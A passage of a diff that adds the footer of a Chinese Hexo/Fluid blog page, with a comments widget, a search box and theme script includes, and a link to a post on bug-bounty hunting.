+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/07/23/SRC%E6%8C%96%E6%8E%98%E6%97%A5%E5%B8%B81/">
+                        <span class="hidden-mobile">SRC漏洞挖掘--SRC挖掘日常1</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1/dist/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"MgDyY5XEdtIKIZHTxzy3GBJV-gzGzoHsz","appKey":"P8Ab9EN1clJmhpYHpamFEiD9","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          Fluid.plugins.initFancyBox('#valine .vcontent img:not(.vemoji)');
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
